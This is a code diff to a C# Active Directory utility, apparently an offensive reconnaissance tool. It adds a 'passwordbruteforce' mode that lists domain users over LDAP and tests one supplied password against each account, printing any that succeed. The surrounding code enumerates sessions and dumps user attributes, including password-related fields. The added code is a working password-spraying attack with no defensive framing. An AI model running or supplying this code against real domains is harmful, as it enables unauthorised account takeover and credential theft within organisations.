@@ -7,6 +7,7 @@ using System.Diagnostics;
 using System.Runtime.InteropServices;
 using System.DirectoryServices;
 using System.DirectoryServices.ActiveDirectory;
+using System.DirectoryServices.AccountManagement;
 using System.IO;
 using System.Collections;
 using System.Security.Principal;
@@ -119,7 +120,7 @@ namespace LdapUtility
             if (output == NERR_Success && offset > 0)
             {
                 int position = Marshal.SizeOf(typeof(SESSION_INFO_10));
-                
+
                 for (int i = 0; i < entriesRead; i++)
                 {
                     IntPtr nextPtr = new IntPtr(offset);
@@ -299,7 +300,49 @@ namespace LdapUtility
                 string option = args[0].ToLower();
                 string domain = args[1];
 
-                if (option == "dumpallusers")
+                if(option == "passwordbruteforce")
+                {
+                    string query = "";
+                    string properties = "samaccountname";
+                    string filter = "";
+
+                    try
+                    {
+                        filter = "(samaccountname=*" + args[3] + "*)";
+                    }
+                    catch
+                    {
+                        filter = "";
+                    }
+
+                    try
+                    {
+                        query = "(&(objectClass=user)" + filter + ")";
+                        List<string> users = LdapQuery(domain, query, properties, false, true);
+                        foreach(string u in users)
+                        {
+                            Console.WriteLine(u);
+                            using (PrincipalContext pc = new PrincipalContext(ContextType.Domain, domain))
+                            {
+                                if(verboseDebug)
+                                {
+                                    Console.WriteLine("Password brute force against {0}\\{1}", domain, u);
+                                }
+                                // validate the credentials
+                                if(pc.ValidateCredentials(u, args[2]))
+                                {
+                                    Console.WriteLine("[SUCCESS] {0}\\{1} password is {2}", domain, u, args[2]);
+                                }
+                            }
+                        }
+                    }
+                    catch (Exception e)
+                    {
+                        Console.WriteLine("ERROR: PasswordBruteForce catched an unexpected exception");
+                        ShowDebug(e, verboseDebug);
+                    }
+                }
+                else if (option == "dumpallusers")
                 {
                     string query = "";
                     string properties = "name,givenname,displayname,samaccountname,adspath,distinguishedname,memberof,ou,mail,proxyaddresses,lastlogon,pwdlastset,mobile,streetaddress,co,title,department,description,comment,badpwdcount,objectcategory,userpassword,scriptpath,managedby,managedobjects";
